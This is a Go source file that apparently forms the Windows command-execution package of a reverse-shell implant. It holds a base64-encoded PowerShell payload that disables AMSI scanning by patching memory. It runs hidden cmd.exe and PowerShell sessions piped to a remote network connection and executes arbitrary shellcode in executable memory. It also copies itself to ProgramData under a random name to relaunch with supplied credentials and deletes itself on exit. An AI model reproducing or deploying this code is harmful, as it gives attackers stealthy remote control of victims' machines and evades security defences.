package shell

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"../utils"
)

const (
	memCommit            = 0x1000
	memReserve           = 0x2000
	pageExecuteReadWrite = 0x40
)

// Shell ...
func Shell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// Powershell ...
func Powershell() (*exec.Cmd, error) {
	amsiBypassEncoded := "ZnVuY3Rpb24gTG9va3VwRnVuYyB7CiAgUGFyYW0gKCRtb2R1bGVOYW1lLCAkZnVuY3Rpb25OYW1lKQogICRhc3NlbSA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0pLkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAkdG1wPUAoKQogICRhc3NlbS5HZXRNZXRob2RzKCkgfCBGb3JFYWNoLU9iamVjdCB7SWYoJF8uTmFtZSAtZXEgIkdldFByb2NBZGRyZXNzIikgeyR0bXArPSRffX0KICByZXR1cm4gJHRtcFswXS5JbnZva2UoJG51bGwsIEAoKCRhc3NlbS5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpKS5JbnZva2UoJG51bGwsIEAoJG1vZHVsZU5hbWUpKSwgJGZ1bmN0aW9uTmFtZSkpCn0KZnVuY3Rpb24gZ2V0RGVsZWdhdGVUeXBlIHsKICBQYXJhbSAoCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkZnVuYywgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJGRlbFR5cGUgPSBbVm9pZF0KICApCiAgJHR5cGUgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi4KICBEZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS4KICBEZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICR0eXBlLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJGZ1bmMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICR0eXBlLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJGRlbFR5cGUsICRmdW5jKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICByZXR1cm4gJHR5cGUuQ3JlYXRlVHlwZSgpCn0KW0ludFB0cl0kZnVuY0FkZHIgPSBMb29rdXBGdW5jIGFtc2kuZGxsIEFtc2lPcGVuU2Vzc2lvbgokb2xkUHJvdGVjdGlvbkJ1ZmZlciA9IDAKJHZwPVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChMb29rdXBGdW5jIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdCksIChnZXREZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkpKQokdnAuSW52b2tlKCRmdW5jQWRkciwgMywgMHg0MCwgW3JlZl0kb2xkUHJvdGVjdGlvbkJ1ZmZlcikKJGJ1ZiA9IFtCeXRlW11dICgweDQ4LCAweDMxLCAweEMwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRidWYsIDAsICRmdW5jQWRkciwgMykKJHZwLkludm9rZSgkZnVuY0FkZHIsIDMsIDB4MjAsIFtyZWZdJG9sZFByb3RlY3Rpb25CdWZmZXIp"
	amsiBypass, _ := base64.StdEncoding.DecodeString(amsiBypassEncoded)
	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "ByPaSs", "-NoExit", "-CoMmAnD", string(amsiBypass))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd, nil
}

// ExecShell ...
func ExecShell(command string, c net.Conn) {
	cmd := exec.Command("\\Windows\\System32\\cmd.exe", "/c", command+"\n")
	rp, wp := io.Pipe()
	cmd.Stdin = c
	cmd.Stdout = wp
	go io.Copy(c, rp)
	cmd.Run()
}

// Exec ...
func Exec(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecPS ...
func ExecPS(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecOut execute a command and retrieves the output
func ExecOut(command string) (string, error) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecPSOut execute a ps command and retrieves the output
func ExecPSOut(command string) (string, error) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecDebug ...
func ExecDebug(cmd string) (string, error) {
	out, err := ExecOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecPSDebug ...
func ExecPSDebug(cmd string) (string, error) {
	out, err := ExecPSOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecSilent ...
func ExecSilent(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// ExecSC executes Shellcode
func ExecSC(sc []byte) {
	// ioutil.WriteFile("met.dll", sc, 0644)
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), memCommit|memReserve, pageExecuteReadWrite)
	if addr == 0 {
		log.Println(err)
		return
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	// this "error" will be "Operation completed successfully"
	log.Println(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// RunAs will rerun the as as the user we specify
func RunAs(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	err := CreateProcessWithLogon(user, pass, domain, path, cmd)
	if err != nil {
		fmt.Println(err)
		return
	}
	c.Close()
	return
}

// RunAsPS ...
func RunAsPS(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	cmdLine := ""
	cmdLine += fmt.Sprintf("$user = '%s\\%s';", domain, user)
	cmdLine += fmt.Sprintf("$password = '%s';", pass)
	cmdLine += fmt.Sprintf("$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;")
	cmdLine += fmt.Sprintf("$credential = New-Object System.Management.Automation.PSCredential $user,$securePassword;")
	cmdLine += fmt.Sprintf("$session = New-PSSession -Credential $credential;")
	cmdLine += fmt.Sprintf("Invoke-Command -Session $session -ScriptBlock {%s};", cmd)

	_, err := ExecPSOut(cmdLine)
	if err != nil {
		c.Write([]byte(fmt.Sprintf("\nRunAsPS Failed: %s\n", err)))
		return
	}
	c.Close()
	return
}

// CopySelf ...
func CopySelf() string {
	currentPath := os.Args[0]
	// random name
	name := utils.RandSeq(8)
	path := fmt.Sprintf("C:\\ProgramData\\%s", fmt.Sprintf("%s.exe", name))
	utils.CopyFile(currentPath, path)
	return path
}

// Seppuku deletes the binary on graceful exit
func Seppuku(c net.Conn) {
	binPath := os.Args[0]
	fmt.Println(binPath)
	go Exec(fmt.Sprintf("ping localhost -n 5 > nul & del %s", binPath), c)
}

func StartSSHServer(port int, c net.Conn) {
	fmt.Println("Not implemented")
}
